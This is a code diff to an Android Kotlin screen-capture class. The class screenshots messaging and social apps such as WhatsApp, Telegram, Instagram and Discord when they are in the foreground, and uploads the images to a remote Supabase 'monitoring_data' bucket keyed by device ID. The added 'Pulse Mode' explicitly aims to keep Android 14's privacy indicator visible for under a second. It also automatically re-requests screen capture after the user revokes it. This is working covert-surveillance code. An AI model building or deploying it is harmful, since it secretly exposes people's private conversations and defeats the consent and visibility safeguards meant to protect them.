@@ -5,13 +5,14 @@ import android.content.Context
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
-import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
 import android.media.projection.MediaProjection
 import android.util.DisplayMetrics
 import android.view.WindowManager
 import android.util.Log
+import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.io.File
 import java.io.FileOutputStream
@@ -21,179 +22,198 @@ import java.util.Locale
 import android.app.usage.UsageStatsManager
 
 /**
- * محرك التقاط الشاشة
- * يقوم بالتقاط صور للشاشة ورفعها إلى السحاب
+ * ScreenCaptureEngine v16 — Pulse Mode
+ *
+ * "Pulse" logic: create VirtualDisplay → grab exactly one frame → release VD immediately
+ * → upload async. This minimizes the Android 14 "Green Dot" duration to < 1 second.
+ *
+ * On SecurityException (revoked projection) → automatically triggers re-acquisition
+ * via MonitoringForegroundService.requestProjectionReacquisition().
  */
 class ScreenCaptureEngine(private val context: Context) {
+
     private val supabase = SupabaseManager.getInstance()
 
     companion object {
         private const val TAG = "ScreenCaptureEngine"
-        private const val BUCKET_NAME = "monitoring_data"
-        private val TARGET_APPS = listOf(
+        private const val BUCKET = "monitoring_data"
+
+        private val TARGET_APPS = setOf(
             "com.whatsapp",
-            "com.facebook.orca", // Messenger
+            "com.facebook.orca",
             "com.instagram.android",
             "com.snapchat.android",
             "com.twitter.android",
             "com.google.android.youtube",
-            "com.zhiliaoapp.musically", // TikTok
+            "com.zhiliaoapp.musically",
             "org.telegram.messenger",
             "com.android.chrome",
-            "com.facebook.katana" // Facebook App
+            "com.facebook.katana",
+            "com.tiktok.android",
+            "com.discord"
         )
     }
 
     /**
-     * تنفيذ عملية الالتقاط والرفع
+     * Main entry point. Runs in a background coroutine.
+     * @param forceCapture bypasses the target-app filter (used by CAPTURE command)
      */
-    suspend fun captureAndUpload(projection: MediaProjection, forceCapture: Boolean = false) = withContext(Dispatchers.IO) {
-        // 1. التحقق من حالة الشاشة لتوفير البطارية (لا نصور والشاشة مغلقة)
-        val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
-        if (!powerManager.isInteractive) {
-            Log.d(TAG, "Screen is OFF. Skipping capture to save battery.")
+    suspend fun captureAndUpload(
+        projection: MediaProjection,
+        forceCapture: Boolean = false
+    ) = withContext(Dispatchers.IO) {
+
+        // ── Guard: screen must be on ──────────────────────────────────────────
+        val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+        if (!pm.isInteractive) {
+            Log.d(TAG, "Screen OFF — skipped")
             return@withContext
         }
 
-        // 2. التحقق من التطبيق المستهدف
-        val currentApp = if (!forceCapture) getForegroundApp() else null
-        if (!forceCapture && (currentApp == null || !TARGET_APPS.contains(currentApp))) {
-            Log.d(TAG, "Skipping capture: foreground app ($currentApp) is not in target list.")
-            return@withContext
-        }
-
-        try {
-            Log.i(TAG, "Starting screen capture...")
-            supabase.logRemote(context, TAG, "INFO", "Started capture process")
-            
-            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
-            val metrics = DisplayMetrics()
-            @Suppress("DEPRECATION")
-            windowManager.defaultDisplay.getRealMetrics(metrics)
-            
-            val width = metrics.widthPixels
-            val height = metrics.heightPixels
-            val density = metrics.densityDpi
-
-            // إعداد ImageReader لالتقاط الإطار
-            @SuppressLint("WrongConstant")
-            val imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
-            var virtualDisplay: VirtualDisplay? = null
-
-            try {
-                virtualDisplay = projection.createVirtualDisplay(
-                    "ScreenCapture",
-                    width, height, density,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                    imageReader.surface, null, null
-                )
-
-                // المحاولة عدة مرات لالتقاط صورة صحيحة
-                var image: android.media.Image? = null
-                for (retry in 1..10) {
-                    image = imageReader.acquireLatestImage()
-                    if (image != null) break
-                    kotlinx.coroutines.delay(200L) // انتظار 200 مللي ثانية بين المحاولات
-                }
-
-                if (image != null) {
-                    try {
-                        val planes = image.planes
-                        val buffer = planes[0].buffer
-                        val pixelStride = planes[0].pixelStride
-                        val rowStride = planes[0].rowStride
-                        val rowPadding = rowStride - pixelStride * width
-
-                        val bitmap = Bitmap.createBitmap(
-                            width + rowPadding / pixelStride,
-                            height,
-                            Bitmap.Config.ARGB_8888
-                        )
-                        bitmap.copyPixelsFromBuffer(buffer)
-                        
-                        // قص الصورة للحجم الأصلي (إزالة الـ padding)
-                        val cleanBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)
-                        
-                        // حفظ كـ WebP مضغوط
-                        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-                        val fileName = "screen_${timestamp}.webp"
-                        val file = File(context.cacheDir, fileName)
-                        
-                        FileOutputStream(file).use { out ->
-                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
-                                cleanBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 75, out)
-                            } else {
-                                @Suppress("DEPRECATION")
-                                cleanBitmap.compress(Bitmap.CompressFormat.WEBP, 75, out)
-                            }
-                        }
-
-                        // الرفع إلى Supabase
-                        supabase.logRemote(context, TAG, "INFO", "Bitmap created. Starting upload to bucket: $BUCKET_NAME")
-                        
-                        val uploadResult = supabase.uploadFile(
-                            file = file,
-                            bucket = BUCKET_NAME,
-                            folder = "screenshots/${getDeviceId()}",
-                            customFileName = fileName
-                        )
-
-                        if (uploadResult is UploadResult.Success) {
-                            Log.i(TAG, "Screenshot uploaded successfully: ${uploadResult.publicUrl}")
-                            supabase.logRemote(context, TAG, "INFO", "Upload Success: ${uploadResult.fileName}")
-                        } else {
-                            val errorMsg = (uploadResult as? UploadResult.Error)?.message ?: "Unknown error"
-                            Log.e(TAG, "Upload failed: $errorMsg")
-                            supabase.logRemote(context, TAG, "ERROR", "Upload failed: $errorMsg")
-                        }
-                        
-                        // تنظيف الملف المؤقت
-                        file.delete()
-                    } finally {
-                        image.close()
-                    }
-                } else {
-                    Log.e(TAG, "Failed to acquire image from ImageReader")
-                    supabase.logRemote(context, TAG, "ERROR", "Failed to acquire image (ImageReader empty)")
-                }
-            } finally {
-                virtualDisplay?.release()
-                imageReader.close()
+        // ── Guard: target app filter ──────────────────────────────────────────
+        if (!forceCapture) {
+            val fg = getForegroundApp()
+            if (fg == null || fg !in TARGET_APPS) {
+                Log.d(TAG, "Skip: foreground=$fg")
+                return@withContext
             }
-
-        } catch (e: Exception) {
-            Log.e(TAG, "General screen capture error: ${e.message}", e)
-            supabase.logRemote(context, TAG, "ERROR", "Capture crash: ${e.message}")
         }
-    }
 
-    private fun getDeviceId(): String {
-        return android.provider.Settings.Secure.getString(
-            context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
-        ) ?: "unknown_device"
+        // ── Pulse: grab frame then release VD immediately ─────────────────────
+        val rawBytes = pulseCapture(projection) ?: return@withContext
+
+        // ── Upload async so we don't block the capture loop ───────────────────
+        CoroutineScope(Dispatchers.IO).launch {
+            uploadBytes(rawBytes)
+        }
     }
 
     /**
-     * جلب اسم حزمة التطبيق الموجود حالياً في المقدمة
+     * PULSE: create VirtualDisplay → acquire one frame → release VD → return raw bytes.
+     * Green dot is visible only during this window (~300–800 ms).
      */
-    private fun getForegroundApp(): String? {
-        try {
-            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
-            val time = System.currentTimeMillis()
-            val stats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 60, time)
-            
-            if (stats != null) {
-                var latestStats: android.app.usage.UsageStats? = null
-                for (usageStats in stats) {
-                    if (latestStats == null || usageStats.lastTimeUsed > latestStats.lastTimeUsed) {
-                        latestStats = usageStats
+    @SuppressLint("WrongConstant")
+    private suspend fun pulseCapture(projection: MediaProjection): ByteArray? =
+        withContext(Dispatchers.IO) {
+            val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            val metrics = DisplayMetrics().also {
+                @Suppress("DEPRECATION")
+                wm.defaultDisplay.getRealMetrics(it)
+            }
+            val w = metrics.widthPixels
+            val h = metrics.heightPixels
+            val dpi = metrics.densityDpi
+
+            val imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
+
+            try {
+                val vd = try {
+                    projection.createVirtualDisplay(
+                        "Pulse",
+                        w, h, dpi,
+                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                        imageReader.surface, null, null
+                    )
+                } catch (se: SecurityException) {
+                    Log.e(TAG, "Projection revoked: ${se.message}")
+                    supabase.logRemote(context, TAG, "WARN", "Projection revoked — requesting re-acquisition")
+                    android.os.Handler(android.os.Looper.getMainLooper()).post {
+                        MonitoringForegroundService.getInstance()?.requestProjectionReacquisition()
+                    }
+                    return@withContext null
+                } catch (ise: IllegalStateException) {
+                    Log.e(TAG, "Projection invalid: ${ise.message}")
+                    android.os.Handler(android.os.Looper.getMainLooper()).post {
+                        MonitoringForegroundService.getInstance()?.requestProjectionReacquisition()
+                    }
+                    return@withContext null
+                }
+
+                // Retry up to 10 × 200 ms = 2 s max
+                var image: android.media.Image? = null
+                repeat(10) {
+                    if (image == null) {
+                        image = imageReader.acquireLatestImage()
+                        if (image == null) kotlinx.coroutines.delay(200)
                     }
                 }
-                return latestStats?.packageName
+
+                // ── Release VD immediately → Green Dot disappears ─────────────
+                vd.release()
+
+                if (image == null) {
+                    Log.e(TAG, "No frame acquired")
+                    supabase.logRemote(context, TAG, "ERROR", "Pulse: no frame after 2s")
+                    return@withContext null
+                }
+
+                return@withContext try {
+                    val plane      = image!!.planes[0]
+                    val buffer     = plane.buffer
+                    val pixelStride = plane.pixelStride
+                    val rowStride  = plane.rowStride
+                    val rowPadding = rowStride - pixelStride * w
+
+                    val bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888)
+                    bmp.copyPixelsFromBuffer(buffer)
+                    val clean = Bitmap.createBitmap(bmp, 0, 0, w, h)
+                    bmp.recycle()
+
+                    val out = java.io.ByteArrayOutputStream()
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+                        clean.compress(Bitmap.CompressFormat.WEBP_LOSSY, 72, out)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        clean.compress(Bitmap.CompressFormat.WEBP, 72, out)
+                    }
+                    clean.recycle()
+                    out.toByteArray()
+                } finally {
+                    image!!.close()
+                }
+
+            } finally {
+                imageReader.close()
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "Error getting foreground app: ${e.message}")
         }
-        return null
+
+    /** Upload pre-encoded bytes to Supabase Storage. */
+    private suspend fun uploadBytes(bytes: ByteArray) = withContext(Dispatchers.IO) {
+        try {
+            val ts       = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+            val fileName = "screen_$ts.webp"
+            val tmpFile  = File(context.cacheDir, fileName)
+            tmpFile.writeBytes(bytes)
+
+            val result = supabase.uploadFile(
+                file = tmpFile,
+                bucket = BUCKET,
+                folder = "screenshots/${getDeviceId()}",
+                customFileName = fileName
+            )
+
+            if (result is UploadResult.Success) {
+                Log.i(TAG, "Screenshot uploaded: ${result.fileName} (${bytes.size / 1024} KB)")
+                supabase.logRemote(context, TAG, "INFO", "Screenshot OK: ${result.fileName}")
+            } else {
+                val err = (result as? UploadResult.Error)?.message ?: "unknown"
+                Log.e(TAG, "Upload failed: $err")
+                supabase.logRemote(context, TAG, "ERROR", "Screenshot upload failed: $err")
+            }
+            tmpFile.delete()
+        } catch (e: Exception) {
+            Log.e(TAG, "uploadBytes error: ${e.message}")
+        }
     }
+
+    private fun getDeviceId(): String = android.provider.Settings.Secure.getString(
+        context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
+    ) ?: "unknown"
+
+    private fun getForegroundApp(): String? = try {
+        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
+        val now = System.currentTimeMillis()
+        usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 60_000, now)
+            ?.maxByOrNull { it.lastTimeUsed }?.packageName
+    } catch (e: Exception) { null }
 }
